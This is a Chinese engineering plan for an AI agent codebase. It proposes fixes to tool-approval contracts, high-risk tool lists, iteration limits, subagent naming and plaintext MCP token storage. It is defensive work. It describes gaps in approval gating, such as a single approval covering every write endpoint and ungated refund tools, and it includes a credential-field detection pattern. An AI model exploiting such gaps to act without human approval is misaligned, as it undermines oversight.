1. **新门三条硬要求**（AGENTS「恒红门优先级」节，标题为 §12f 而全仓引用写作"§12e 同型"——派单时按内容找，不要按编号找）：① 定级前必须现读存量，非零即走"该文件 HEAD 自身存量"棘轮；② 判据必须覆盖门自己产出的形态（D139 的端清单、D167 的未判定桶、D169 的三态都是这一条的应用）；③ 取不到必须 exit 2 判"无法判定"，绝不记绿。
2. **接线成套**：`scripts/gate-registry-insert.mjs`（HEAD 为底、认两种引号 id、结构等值零损失、落盘前 `node --check`）+ skipEnv + AGENTS/README 点名 + **门体与注册同枚入库** + 交付报告印 `git cat-file -e HEAD:<门体>` 结果。
3. **取证卫生**：凡把判据结论写进台账/报告，经 `scripts/run-evidence.mjs <件> … -- <命令>` 落件并 `--verify` 读回；拿不到 `complete` 就写"未判定"（`--verify` 的三态正是本族所有"数字现读"要求的执行载体）。

## 族 D · 契约地基 / 引擎一致性 / 凭据 / 可观测（D142 D143 D144 D145 D146 D147）

取证面一律 HEAD（`git show HEAD:<path>` / `git grep -n <re> HEAD -- <面>`），本会话 2026-09-28 现读；数字旁附命令。
**本族复验推翻三处说法**：D143「默认高危清单是空的」、D145「CLI persona = researcher/coder/reviewer/planner/general」「服务端 = 5 个命名 agent」、D147「仓内未命中 OTel / 无分布式追踪」——三条原文在各票第 2 栏点名并给命令，不得照票面派单。
跨票共同遵守：**同一件事只许一处交集实现**，本族新增的机制一共只允许两把新尺子（D142 扩门 111、D144 扩 doom-loop 门），其余一律挂在现有门上；不新造"高危清单""别名清单""trace 字段"的第二份同名机制。

### D142 契约地基:工具契约层有类型定义、运行时零落地(承 V4 #99;取证 2026-09-28)

1. 目标行为：模型说"我要删这个文件"时，批准与否由**这个工具会碰到什么**决定，而不是由它叫什么名字猜。
2. 现状锚点（HEAD 现读）：类型面在位 —— `packages/types/src/tool-contract.ts:36`(7 档 effectScope)/`:173`(read|write|dangerous)/`:188` ToolPermissionContract/`:216` ToolResultBudgetContract；同文件头注自陈"追踪语义本轮不装字段位"。消费面：`git grep -n 'effectScope' HEAD -- apps/cli/src/tools` = **0**；`git grep -n 'contract: {' HEAD -- apps/cli/src | grep -v test` = **0**；`git grep -ln 'ToolPermissionContract' HEAD` 只命中声明文件 + 两份文档。**但"零落地"要改口为"落了一半"**：resultBudget 一支已在 executor 边界消费 —— `apps/cli/src/tools/index.ts:667`(`tool.contract?.resultBudget`)/`:830` 与 `apps/cli/src/tools/result-envelope/budgets.ts:111 projectContractResultBudget` ⇒ **本票射程 = 权限轴，不得重写预算轴**。既有门射程：111 判"注册面有没有声明 + 摘除必红（身份台账）+ TRD 宽限"、113 判路由身份键、115 判校验器接线、121 判 `*Contract` 有无生产 importer；**没有一道判"字段值是否改变决策"**。门 121 现读只报 `touchesExternalWorld` 未接线、**未报** `ToolPermissionContract`（其生产面 importer 实测 0）——疑因 C3(`scripts/check-declared-policy-has-consumer.mjs:100`)按模块而非按符号认消费者（同文件 `:237 permission: ToolPermissionContract` + `packages/types/src/schema-projection.ts:20` 导入邻居即算接线）：`未取证：动手前先读 decide() 的 C3 分支确认，不得凭推测改门`。
3. 改动分解：① **止血(Python 地基)** —— `apps/ai-service/app/services/mcp_server.py:610` `@dataclass MCPTool`（现读只有 name/description/input_schema）增 `effect_scopes`/`risk_level`/`result_budget` 三字段带**最保守档**默认值 + 类注释登记迁移期；构造点 90 处（命令：`git show HEAD:apps/ai-service/app/services/mcp_server.py | grep -c 'MCPTool('`），先只补"能由现有 dangerLevel / `_ADMIN_ONLY_TOOLS` / 高危集推出"的族，其余留默认值。② **根治(唯一交集实现)** —— 新建 `apps/ai-service/app/core/tool_effect.py`：7 档成员名 + 两条谓词（算不算改写 / 算不算出网）只写这一份，`mcp_server.py`、`agent_loop_v2.py`、`routers/llm.py` 三处一律 import 它，**禁止在任一处再抄档名清单**；TS 侧唯一源仍是 `tool-contract.ts`，两侧名集等值由 ④ 钉。③ **根治(消费点)** —— `apps/ai-service/app/services/agent_loop_v2.py:5011` 的 `needs_approval = self._approval_enabled and self._is_high_risk_tool_instance(tc.name)` 改为"契约优先、名字表兜底"的唯一判定出口；CLI 侧同轴落在 `apps/cli/src/tools/permissions.ts:107 decideWithMode`（现读入参是 `dangerLevel` 字符串）新增契约入参。④ **尺子（扩现有门，不新立）** —— `scripts/check-tool-contract-declared.mjs` 加 **TC4 字段级消费对账**：某工具声明了 `permission.effectScope` ⇒ 该值必须在决策路径读取点出现（py: `tool_effect` 谓词调用；ts: `decideWithMode`），只 import 不读即红；同笔把门 121 C3 从"按模块"收到"按符号"（2①/2② 的取证支撑，须先补 `未取证` 那一格）。
4. 受影响文件：`apps/ai-service/app/services/mcp_server.py`、`apps/ai-service/app/core/tool_effect.py`[新]、`apps/ai-service/app/services/agent_loop_v2.py`、`apps/ai-service/app/routers/llm.py`、`apps/cli/src/tools/permissions.ts`、`apps/cli/src/tools/index.ts`、`packages/types/src/tool-contract.ts`（只加注释/别名，不改值域）、`scripts/check-tool-contract-declared.mjs`、`scripts/tests/check-tool-contract-declared.test.mjs`、`scripts/check-declared-policy-has-consumer.mjs`+其测试、`apps/ai-service/tests/test_tool_effect_single_source.py`[新]、`apps/cli/tests/tool-permission-contract-consumed.test.ts`[新]。
5. 跨端与 i18n：契约是**引擎侧**能力，不新增用户可见文案 ⇒ 无新键。web/miniapp/mobile-rn/desktop/extension 不写第二份 effect 档名，一律经 `@ihui/types` + `packages/api-client` 的既有投影；CLI 与 ai-service 是本票两个消费端（§9 双端同步，非"只改一端"）。
6. 验收判据：`node scripts/check-tool-contract-declared.mjs`（HEAD 档）exit 0 且报告新增一行 `TC4 消费对账: 声明 N / 被读 M`（N>0，不得只报"已对齐"）；行为断言（票面要求，**必须**是行为不是文本）：`python -m pytest apps/ai-service/tests/test_tool_effect_single_source.py -k 'flip_effect_scope_changes_approval'` —— 把 `db_query` 的 `effect_scopes` 从 `('system',)` 改成 `('none',)`，同一 fixture 的审批请求数从 1 变 0；反向对照：只改注释里的档名不改字段 ⇒ 该用例必须仍绿（证明判据读的是字段值而非字面量）；`node --test scripts/tests/check-tool-contract-declared.test.mjs` 末行现读，须含"声明了却没被读 ⇒ 红"与"没声明 ⇒ 走兜底不判红"成对两例。
7. 依赖与顺序：可独立派，但**D143 与"对话流保真④ 结构化摘要"以本票②为前置**（清单要从契约推导，就得先有可推导的字段）；①②③同一枚提交内落地，④ 必须与③同笔（否则 TC4 对着一台没有消费点的仓库判红 = 恒红门，§12e）。存量按棘轮：① 的默认值就是棘轮的"存量不判红"通道，禁止为消红去删字段。
8. 风险与回退：最大风险是**翻缺省语义**——把"未声明即按保守档"实现成"未声明即拦"，用户侧表现是"昨天能跑今天全要批准"（AGENTS 门 115 那条警告原话）。故①的默认值只影响**新声明的工具**，未声明者行为与改前逐字相同，并由 `apps/ai-service/tests/test_tool_effect_single_source.py` 里"零声明 ⇒ 决策与改前一致"的对照用例钉住。回退：删 ③ 的两处消费点即恢复旧行为（① 的字段与 ② 的模块可留在原地不产生行为）。**需 §24 拍板：无**（不改用户可见默认行为）；若第二阶段要把缺省翻成 fail-closed，另计一票并附 `--flip-audit` 清单。

### D143 契约地基:高危工具清单默认空,须等用户拍板(承 V4 #100;取证 2026-09-28)

1. 目标行为：默认安装下，"会丢数据/会花钱/会出网带凭据"的动作都先问我一次；而我什么都不配时，这个能力是真的在，不是形同虚设。
2. 现状锚点 + **推翻票面**：票面"`_high_risk_tools_from_env()` 未配置即返回 `frozenset()` ⇒ 默认部署高危清单是空的"**已过期** —— `apps/ai-service/app/services/agent_loop_v2.py:236` 有内置 `_DEFAULT_HIGH_RISK_TOOLS`(16 名) + `:260 _HIGH_RISK_PREFIXES=("computer_",)`，`:263 _matches_high_risk_name()` 是它唯一判据出口，`:293` 的 env 函数只做**追加**（`:4270 _is_high_risk_tool_instance = 名字表 ∪ env 追加`）。命令：`git show HEAD:apps/ai-service/app/services/agent_loop_v2.py | sed -n '236,272p'`。票面"`TOOL_APPROVAL_ENABLED` 默认 true"仍成立（`:276`），且已登记进 `apps/ai-service/app/core/capability_matrix.py:674 key=tool_approval`。真正在的三格：**(a) 名单里有死条目** —— `file_batch_edit` / `edit_file` / `create_file` / `delete_file` / `computer_key_type` / `computer_screenshot` 六个名字在注册表里**不存在**（命令：对每个名跑 `git show HEAD:apps/ai-service/app/services/mcp_server.py | grep -cE "^        name=\"<n>\","` = 0），即 16 项里 6 项不咬合；**(b) 真高危没进表**（逐条副作用证据）—— `api_endpoint_call`（`apps/ai-service/app/services/api_tools_bridge.py:532`，一个名字覆盖任意后端写接口 ⇒ 按名审批等于一次批全部）、`edu_create_refund`(:9534)/`edu_approve_refund`/`edu_reject_refund`（不可逆资金动作，且全仓无第二道确认；`conversation.py:241,244` 只是意图路由正则，不是审批）、`run_in_background`、`schedule_task`、`configure_automation_task`、`computer_clipboard_set`；**(c) 跨语言/跨端各一份表** —— TS 侧三份危险式清单互不相认：`packages/shared/src/utils/dangerous-command-detector.ts:63 DANGEROUS_PATTERNS`（其头注自称"避免硬编码 2 处"）、`apps/cli/src/tools/command-safety.ts:29 DANGEROUS_COMMAND_PATTERNS`（该文件 import 列表里**没有**共享检测器，现读只 import `./command-policy/index.js`）、`apps/cli/src/tools/sandbox/policy.ts:105 DANGEROUS_SANDBOX_PATTERNS`。
3. 改动分解：① **止血（零行为变更）** 删除 (a) 六个死条目，并给 `_matches_high_risk_name` 配一条"名单每个名字必须能在注册表解析到"的自检（挂在 D142② 的 `tool_effect.py` 同一模块，避免又造一份尺子）。② **根治（推导而非手写）** 高危集改为**从 D142 契约投影**：`tool_effect.high_risk_tool_names()` = 「`effect_scopes ∩ {workspace, repository, system}` 且 `risk_level != 'read'`」的工具名集合，`_DEFAULT_HIGH_RISK_TOOLS` 降级为**登记过理由的显式追加表**（`ADDITIONAL_HIGH_RISK: dict[str, str]`，键=名、值=为什么契约推不出来），env 仍是追加；TS 侧 `packages/shared/src/utils/dangerous-command-detector.ts` 认作命令**内容**维度的唯一源，另两份改为 re-export（§3 共享层优先）。③ **入参维度**（补名字表结构上判不了的那一格）：`api_endpoint_call` 的审批判定按 `ToolPermissionContract.matchSources`(`packages/types/src/tool-contract.ts:178`) 的 `path` 取被调方法的读写性，写方法 ⇒ 问；只按名批一次不允许覆盖后续不同 endpoint。
4. 受影响文件：`apps/ai-service/app/core/tool_effect.py`(承 D142②)、`apps/ai-service/app/services/agent_loop_v2.py`、`apps/ai-service/app/services/api_tools_bridge.py`、`apps/cli/src/tools/command-safety.ts`、`apps/cli/src/tools/sandbox/policy.ts`、`packages/shared/src/utils/dangerous-command-detector.ts`、`scripts/check-tool-contract-declared.mjs`(加 TC5：名单条目必须可解析 + 必须由契约或带理由的追加表推出)、`apps/ai-service/tests/test_high_risk_set_derivation.py`[新]、`packages/shared/src/utils/__tests__/dangerous-command-detector.test.ts`(补两侧同判)。
5. 跨端与 i18n：CLI 与 ai-service 两条链同批（§9）；web/desktop/miniapp 只经 SSE `tool-approval` 帧显示，不改。新增文案 2 条（zh 原文照此登记，五语言同批）：`chat.toolApproval.highRiskBanner` = 「该操作会改动数据或对外发送，已暂停等待你的确认」；`cli.security.degradedRiskList` = 「高危集来自内置默认（非纯环境配置），追加请设 TOOL_APPROVAL_HIGH_RISK_TOOLS」。
6. 验收判据：阳性对照（票面要求的"不设任何 env 时删除操作必须触发审批"）：`python -m pytest apps/ai-service/tests/test_high_risk_set_derivation.py -k 'default_env_still_approves'`，断言 `env` 全清空时 `file_edit`/`edu_create_refund`/`api_endpoint_call(写方法)` 三者 `needs_approval is True`；推导一致性：同一测试内 `assert high_risk_tool_names() | set(ADDITIONAL_HIGH_RISK) == 现判定集合`（防"表与推导各活一份"）；死条目清零：`node scripts/check-tool-contract-declared.mjs --self-test` 末行现读须含"名单条目不可解析 = 0"；**反向对照**：往 `ADDITIONAL_HIGH_RISK` 塞一个注册表里不存在的名字 ⇒ 自检必须红（证明 (a) 那一型不会再回来）。
7. 依赖与顺序：**硬依赖 D142②③**（没有字段就没得推导）；①（清死条目）可先行且属止血。与 D144 无冲突（一个动审批轴、一个动轮次轴）。
8. 风险与回退：**需 §24 拍板**（改变默认部署的用户可见行为）。可直接批准的预填方案：**(A) 档位** —— 三档不变（read 静默放行 / write 会话内首次问 + 可"本会话不再问" / dangerous 每次问且不给"永久允许"，对齐 `TOOL_PERSIST_SCOPES` `packages/types/src/tool-contract.ts:184`）；**(B) 内置默认高危（契约自动推出，不需 env）** —— `write_file`、`file_edit`、`resolve_conflict`、`git_operations`、`db_query`、`run_command`、`computer_*`(整族，现读唯一前缀族)、`browser_click_element`、`browser_type_text`、`api_endpoint_call`（仅当目标方法判为写）；**(C) 需人点头才加的显式追加（契约推不出，附理由）** —— `edu_create_refund`/`edu_approve_refund`/`edu_reject_refund`（资金不可逆，但 dangerLevel 现值可能是 write）、`edu_send_fee_reminder_batch`（批量对外触达真人）、`schedule_task`/`configure_automation_task`（延后执行 = 副作用离开本轮）、`run_in_background`、`computer_clipboard_set`（写系统状态）。**(D) 翻档失败会怎样**：把缺省翻成"未声明即高危"= 现读 90 个构造点全落默认档 ⇒ 每一次工具调用都弹窗，即 AGENTS 门 115 那句"不是收紧安全，是制造事故"的原型；因此 (B)(C) 落地期间缺省档必须是"未声明 ⇒ 沿用名字表"，env 与 `TOOL_APPROVAL_ENABLED=false` 两条退出通道一字不改，回退 = 删 `ADDITIONAL_HIGH_RISK` 的行（不动推导），爆炸半径逐条独立。

### D144 引擎一致性:主循环轮次上限四个默认值无尺子 + V1 出口壳仍在生产(承 V4 #101;取证 2026-09-28)

1. 目标行为：同一个 agent 任务，不管我走网页、走桌面还是走命令行，它"最多试多少轮就该停下来"这件事是同一个约定，或至少差异是写明白了的。
2. 现状锚点（四档现读，行号与票面略有漂移，以现读为准）：`apps/ai-service/app/services/agent_loop_v2.py:1480` ctor `max_iterations: int = 10`（另有 `:1467` 工厂位同值 10）；`apps/ai-service/app/core/config.py:64 max_agent_iterations: int = 8`；`apps/ai-service/app/services/agent_engine.py:2298` 与 `:2515` 两处 `... or 8`（票面写的 2334/2551 是旧行号）；`apps/cli/src/config/defaults.ts:17 maxIterations: 25`。**第五档票面漏了**：`apps/ai-service/app/services/agent_loop.py:226` 用 `settings.max_agent_iterations`（V1），即 8 经 V1 又生效一次。尺子缺位确认：`grep -n 'max_iterations\|maxIterations' scripts/check-doom-loop-parity.mjs` 无命中，而该门 `:56 POLICY_NUMBERS` 已含 7 个同族标量（窗口/重复/冷却/终止轮数…）⇒ 票面"没有任何一道门看它"成立。V1 生产引用现读 **4 处**（票面 3 处）：`app/routers/agents.py:48`、`app/services/a2a_service.py:33`、`app/services/slash_commands.py:162`、**加 `app/services/agent_loop_v2.py:2794,2807`（V2 自己反向 import V1 的 `AgentExecutor`）** ⇒ "一套半"这个说法低估了耦合：不是 V1 挂着 V2，是两两互引。
3. 改动分解：① **止血** 不动任何默认值，先把四档现值 + "为什么不同"写进唯一登记表（见②），并让 `agent_loop_v2.py:2794` 那两处 V1 import 在报告里报名（V2 依赖 V1 是本轮新证据，不修只登记）。② **根治（并入现成尺子，不另立门）** TS 侧把轮次语义收进 `packages/shared/src/agent/doom-loop-detector.ts`（该门已认它是"TS 唯一算法源"）新增 `export const MAX_ITERATION_DEFAULT/ALLOWED_DIVERGENCE`；Python 侧在 `apps/ai-service/app/core/doom_loop.py` 同名同形；扩 `scripts/check-doom-loop-parity.mjs` 的 `POLICY_NUMBERS` 加 `AGENT_MAX_ITERATIONS`，并新增 **P4 差异白名单**：两侧值不等仅在登记表里带 `reason` + 到期日时放过（照 `scripts/sync-miniapp-chrome.mjs` 的 `CHROME_DECLARED_DIVERGENCE` + `scripts/check-miniapp-chrome.mjs` 的"源头重新同值即判清单腐烂"两态设计），CLI=25 与引擎=10 属这一档。③ **V1 归一或如实登记**：`agent_loop.py` 现读 `:553` 注释已自述"max_iterations / tools 参数已弃用，仅保留签名兼容"、`:555`"新链路默认走 AgentLoopV2，不要试图修复本方法" ⇒ 三选一拍板后只做一件：把 `routers/agents.py:995` 的 `agent_executor.run(...)` 改指 V2，或把 V1 定位为"非流式兼容壳"并在 `capability_matrix.py` 登记（不许留成"看起来是第二套内核"）。
4. 受影响文件：`packages/shared/src/agent/doom-loop-detector.ts`、`apps/ai-service/app/core/doom_loop.py`、`scripts/check-doom-loop-parity.mjs`、`scripts/tests/check-doom-loop-parity.test.mjs`、`apps/ai-service/app/services/agent_loop.py`、`apps/ai-service/app/services/agent_loop_v2.py`(仅 ③ 与登记注释)、`apps/ai-service/app/core/capability_matrix.py`、③ 若改指 V2 则再加 `apps/ai-service/app/routers/agents.py`、`apps/ai-service/tests/test_max_iteration_divergence.py`[新]。
5. 跨端与 i18n：CLI(ai-service 之外的第二个执行体)与本侧共用一张表 ⇒ 两端同批；web/desktop/miniapp 不改（无本地轮次概念）。无新增用户可见文案；web 端现读**已有**两处轮次文案（`packages/i18n/messages/web/zh-CN.json:7135 "maxIterations"=「最大迭代」`(agent 配置块，紧邻 `:7134 permissionMode`) 与 `:18279 "maxIterations"=「深挖轮数(最大)」`(深度研究块)）⇒ 若 ③ 选"归一"改变实际轮数，只需复核这两条是否要跟随语义，**不新登记键**（新键无消费者正是门 121 要拦的那一型）。
6. 验收判据：`node scripts/check-doom-loop-parity.mjs` exit 0 且输出逐档打印实际生效值（`AGENT_MAX_ITERATIONS: ts=… py=… cli=…`，票面"不得只报已对齐"）；**改一侧不跟必红**（票面验收①）：`node scripts/check-doom-loop-parity.mjs --self-test` 内置变异例——把 py 侧 `AGENT_MAX_ITERATIONS = 10` 改 99 且白名单无对应条目 ⇒ 判红；反向对照：值不等但白名单带 reason+未到期 ⇒ 判绿且打印"已声明差异"；到期后又红一条（照 `scripts/check-exemption-expiry.mjs` 的 E2 语义）。
7. 依赖与顺序：无前置，可独立派；③ 不得先于 ①②（没有登记表就把 V1 改指 V2，等于在无人知道默认值是多少的情况下换内核）。② 与 D142④ 都动门文件但不同门，无冲突。
8. 风险与回退：轮次**变小**会让长任务提前终止（用户可感知），**变大**会让失控成本上升，所以②阶段刻意**不改值只钉表**；回退 = 从 `POLICY_NUMBERS` 摘掉该键（其余 7 键不受影响），爆炸半径一门。③ 属行为变更：**需 §24 拍板**，预填推荐 = **把 `routers/agents.py` 一处改指 V2 + 其余（a2a_service / slash_commands / V2 内部两处）本轮不动**，理由是 HEAD 现读 V1 的那条实现"当前单轮"（`:553`），改指即消除"同一个 agent 有两种跑法"；否决项 = 整删 V1（§7 删除安全：a2a 与 slash_commands 承载功能未逐条核过）。

### D145 引擎一致性:子代理词汇双轨与状态词汇三域(承 V4 #102;取证 2026-09-28)

1. 目标行为：我在网页上派一个"代码审查"子代理，和我在命令行里派同一个角色，屏幕上的角色名与状态词是同一套，而且派出去**真的有人接活**。
2. 现状锚点 + **推翻票面两处**：(a) CLI persona 现读是 **researcher / coder / reviewer / architect / debugger** 五个（命令 `git show HEAD:apps/cli/src/personas/contracts.ts | grep -nE '^  [a-z_]+: \{'` → :10/:43/:83/:124/:164），票面写的"planner/general"**不存在**；(b) 服务端真正可执行的注册表**不是 5 个而是 10 个**：`apps/ai-service/app/services/agent_orchestrator.py:119 _register_defaults()` = researcher/coder/reviewer/architect/debugger/frontend-dev/backend-dev/devops/security-auditor/test-engineer，前 5 个与 CLI persona **逐字相同**（⇒ "零映射"这一说法对不上注册表）。票面引的"5 个命名 agent(code-reviewer/bug-fixer/…)"其实只出现在 `apps/ai-service/app/services/mcp_server.py:8396-8405` 的 **dispatch_subagent 工具描述文本**里，`git grep -n 'bug-fixer\|refactorer\|feature-planner' HEAD -- apps/ai-service/app` 只命中这两行描述 ⇒ **描述向模型广告了 5 个注册表里根本不存在的名**。硬后果：`agent_orchestrator.invoke`(:312) 在 `:~336` `self._registry.get(agent_name)` 落空即返回 `error=f"Agent 不存在: {agent_name}"`，即模型照说明书调用**必失败**。第三条轴（票面未提）：展示昵称池 `apps/web/src/hooks/use-agent-progress.ts:213-223 NICKNAME_POOL`(10 个 Codex 风名) 与 `apps/extension/entrypoints/sidepanel/components/MessageContent.tsx:408-416` 的 `chat.subagentRole*` 映射（validator/reviewer/explorer/implementer/planner/tester/researcher/optimizer/debugger/refactorer）——**与两套执行名都无映射**，且 `subagentRole*` 键现读只在 extension 语言包（`git grep -l 'subagentRole' HEAD -- packages/i18n` 只命中 extension 五份），web 端拿不到本地化角色名。状态三域锚点核实：`packages/types/src/agent-runtime.ts:1215`(六态 canonical)/`:1234 WORKSPACE_AGENT_TASK_STATUSES`(四态，单 l `canceled`)/`:1483` 一带 `cancelled`(双 l)——与票面一致；守门 151 现读只判六态族的 SV1–SV3（`scripts/check-agent-status-vocabulary-parity.mjs:48 FILES` = agent-runtime.ts + dag_scheduler.py 两份），其头注自陈"两域相交后端内各自猜域"，**第三族（BgAgentStatus）不在其内** ⇒ 本票不得再造一份状态清单，只能扩 151。
3. 改动分解：① **止血（真 bug，先于一切命名工程）** 把 `mcp_server.py:8396` 描述里的 5 个名字改为**现读注册表**得到（`orchestrator.names()` 拼进描述，或退一步改成注册表里真存在的名），杜绝"说明书指一条不存在的门"；同时给 `_tool_dispatch_subagent` 的未知名回包补 `availableAgents` 字段（让模型可自我纠正，而不是撞第二次）。② **根治（唯一源 + 投影）** 角色别名表放 `packages/types/src/agent-runtime.ts` 旁新建 `packages/types/src/subagent-roles.ts`：`SUBAGENT_ROLES = [{key, personas?: string, orchestratorName?: string, nickname?: string, displayKey: 'chat.subagentRole<Key>'}]`，**四轴（persona / orchestrator / nickname / i18n 键）在同一份里对齐**；CLI `personas/contracts.ts` 与 ai-service `agent_orchestrator.py` 各自从它投影（Python 侧显式登记一份对齐表是允许的形态，但必须有门判等值 —— 照 151 SV1 的既有写法，不新立门）。③ **扩门 151 两族**：SV4 角色面（persona 名 ⊆ 注册表名；`subagentRole*` 键在**每语言包**齐；描述文本里出现的 agent 名必须能在注册表解析 ⇒ 直接钉死①那一型）；SV5 第三状态族（`BgAgentStatus` 与 `SubagentSpawnResponse.status`(`agent-runtime.ts:1485` 现读 `spawned|running|completed|failed`) 各自登记域名 + 与六态/四态的映射，**不合并值域**（合并＝改对外契约））。
4. 受影响文件：`packages/types/src/subagent-roles.ts`[新]、`packages/types/src/agent-runtime.ts`、`apps/ai-service/app/services/mcp_server.py`(仅描述文本与回包)、`apps/ai-service/app/services/agent_orchestrator.py`、`apps/cli/src/personas/contracts.ts`、`scripts/check-agent-status-vocabulary-parity.mjs` + `scripts/tests/check-agent-status-vocabulary-parity.test.mjs`、`apps/web/src/hooks/use-agent-progress.ts`(改取键，不改池)、`apps/extension/entrypoints/sidepanel/components/MessageContent.tsx`、`packages/i18n/messages/{web,shared,extension}/*.json`(五语言同批)。
5. 跨端与 i18n：§9 全端 —— web / extension / miniapp-taro / mobile-rn / desktop 凡渲染子代理徽章处一律改为取 `chat.subagentRole<Key>`，禁止端内再抄一份名字→色/名→文案映射（现存两份：`use-agent-progress.ts`、`MessageContent.tsx`）。新增键（extension 已有 10 个，**web/shared 补齐同 10 个**，zh 原文照 extension 现值）：`chat.subagentRoleValidator`=校验者、`…Reviewer`=审查者、`…Explorer`=探索者、`…Implementer`=实现者、`…Planner`=规划者、`…Tester`=测试者、`…Researcher`=研究者、`…Optimizer`=优化者、`…Debugger`=调试者、`…Refactorer`=重构者；另加 1 条新文案 `chat.subagentUnknownAgent`=「该角色尚未注册，可选：{names}」（五语言同批，`{names}` 原样保留）。
6. 验收判据：同一角色两端显示逐字相同 —— `node --test scripts/tests/check-agent-status-vocabulary-parity.test.mjs` 新增例：对 `SUBAGENT_ROLES` 每个成员，断言 persona 名与 displayKey 在五语言包里都有非空、且不等于键名（复用门 74 那族"解析不出即红"的口径）；**摘一名必红**（票面验收②）：自检例 SV4-x 删掉 `RESEARCHER` 一行 ⇒ 红；反向对照：删的是 `nickname` 字段而 personas/orchestrator 仍在 ⇒ 不得红（防把门做成"改任何字段都炸"）；①那条真 bug 的独立回归：`python -m pytest apps/ai-service/tests/test_dispatch_subagent_advertised_names.py::test_every_advertised_name_resolves`（新文件，命令现读描述里的名字列表并对 `orchestrator.get` 逐个断言非 None）。
7. 依赖与顺序：与 D142/D143 无依赖，可并行；但① 属止血应**优先**（它是一条当前必失败的用户路径）；SV5 不得早于 151 镜像测试的 T1 装车例更新（否则定级漂移）。
8. 风险与回退：**需 §24 拍板：是**（用户可见角色名与状态词会变）。预填方案：**(A) 展示名一律取昵称池那 10 个中文口径（上表），执行名一律取注册表那 10 个，两者用 `subagent-roles.ts` 对齐，不改任何 wire 值**（`canceled`/`cancelled` 拼写、六态落库值、SSE `subagent_*` 事件名一字不动，动了就是对外契约变更）；**(B) 不合并状态域**：只登记 + 映射，UI 同一屏禁止混排两域（判据 SV5）；**(C) 描述文本改为动态读注册表**而不是硬编码第二份名单。回退：`subagent-roles.ts` 是纯新增文件、①③ 只改描述与判据 ⇒ 一次 revert 该票提交即回到现值；爆炸半径限制在子代理展示层，不触数据库与 SSE。

### D146 凭据治理:MCP 凭据明文落文件,游离在 §5d 纪律之外(承 V4 #103;取证 2026-09-28)

1. 目标行为：我在自己机器上给某个 MCP 服务器授权完，那把 token 不该以能 `cat` 出来的形式躺着；如果退化成明文文件，机器上要告诉我、并告诉我在哪。
2. 现状锚点：`apps/cli/src/tools/mcp-credentials.ts:21 CREDENTIALS_FILENAME` + `:24 getCredentialsPath()`（`IHUI_HOME` 优先、回退 `~/.ihui`）把 `{accessToken, refreshToken, expiresAt, scope, obtainedAt}` 按 serverUrl 明文写 JSON（`:12` 结构注释自陈），仅靠 `fs.chmod` 0600（文件头注自述 Windows 下 chmod 只对 owner 有效）；写入链在 `apps/cli/src/tools/mcp-oauth.ts:24`（第 6 步"保存到 mcp-credentials.json"）。**仓内已有的同类既有实现不止一份，票面只提"钥匙串"而漏了它们**：`apps/web/src/lib/local-vault.ts`（D48/G-56：`ihuiVaultV1` 信封 + A256GCM + HKDF 域分隔，主密钥经 tauri-plugin-store 通道，明文不落盘；配套判据在 AGENTS 的 `check-desktop-cache-plaintext` 一条）与 `apps/ai-service/app/services/publish/credentials_crypto.py`（服务端凭据加密）。OS 钥匙串侧现读**零实现**：`git grep -lniE 'keytar|wincred|CredentialManager|ProtectedData' HEAD -- apps packages` 命中的 5 个文件全是 passkey/WebAuthn（`packages/auth/src/providers/passkey.ts` 等），与凭据存储无关 ⇒ "接 OS 钥匙串"这一步的可行性 `未取证`：本机 `powershell.exe` 与 `pwsh.exe` 按 §26 是同一 7.6.2 引擎，`.NET Framework` GAC 的 `System.Security.Cryptography.ProtectedData` 在 PS7 下能否 `Add-Type` 起来**未实测**，动工第一步就是这个探针。纪律面：`scripts/check-credential-health.mjs` 现读只管**服务端/部署侧**凭据活性（其 `:29` 自述"全程只输出长度+掩码+sha256 短摘要"，`:55` 走 `scripts/lib/key-dir.mjs`），完全不涉及 CLI 本地 MCP 凭据 ⇒ 票面"纳入守门 67 与 107 射程"两处需更正：门 67 判的是**错误消息里外泄凭据**（传输语义），门 107 判的是**第三方内容来源台账**（provenance），**两者都不是"凭据在磁盘上是否明文"这一型**，硬塞只会让那两道门的判据变形。
3. 改动分解：① **止血（不写新机制，先把现状变得可见）** `getCredentialsPath()` 之外加一个 `describeCredentialStore(): {backend:'keychain'|'encrypted-file'|'plaintext-file', path, reason}` 出口，`apps/cli/src/commands/capabilities.ts` 与任何打印凭据状态的命令都经它，输出恒含落点绝对路径 + 档位；写盘后自检一次"这个文件是不是还能被 `JSON.parse` 直接读出 token"，是则打一行 WARN（**不得静默**，§5e"失败必须响"同条禁令）。② **根治(优先复用，而非新增依赖)** 落盘格式**直接采用** `local-vault.ts` 已定型的信封语义（`{ihuiVaultV1:{alg,kid,iv,ct}}` 结构级判据 + HKDF 域 info 用 `ihui-cli/mcp-credentials/v1`），主密钥后端按三档降级：OS 凭据（探针通过才用，Windows 用 `cmdkey`/DPAPI 二选一，见① 探针）→ 机器绑定口令文件（`scripts/lib/key-dir.mjs` 的候选序，**不得再抄一份盘符表**）→ 明文（必须落① 的档位并在 `--capabilities` 报出）。③ **幂等迁移** 现存量明文按 `local-vault.ts` 已验证的"恰一层、非双重包裹"判据做迁移，读失败/包裹不完整一律**不覆盖**（照该文件硬约束 1："宁可这一轮写明文，也不制造解不开的密文"）。④ **尺子（挂现有门，不新立）** 扩 `scripts/check-credential-leak-in-message.mjs`(门 67) 新增一维 **AT**（at-rest）：非测试面 `writeFileSync`/`fs.promises.writeFile` 写出的对象若含 `accessToken|refreshToken|client_secret` 且同文件未经 ② 的信封出口 ⇒ 红，棘轮锚点 = 该文件 HEAD 自身存量；**只在门 67 加维，不再新建凭据落盘门**（新建就会与 67 各判一半，本仓同型事故已记多次）。
4. 受影响文件：`apps/cli/src/tools/mcp-credentials.ts`、`apps/cli/src/tools/mcp-oauth.ts`、`apps/cli/src/commands/capabilities.ts`、`apps/cli/src/config/credentials.ts`(仅复用其 `maskSecret`)、`scripts/check-credential-leak-in-message.mjs` + `scripts/tests/check-credential-leak-in-message.test.mjs`、`apps/cli/tests/mcp-credentials-store-backend.test.ts`[新]、`docs/runtime-capability-disclosure.md`(登记落点与档位；属既有文档增补，非新计划文件)。
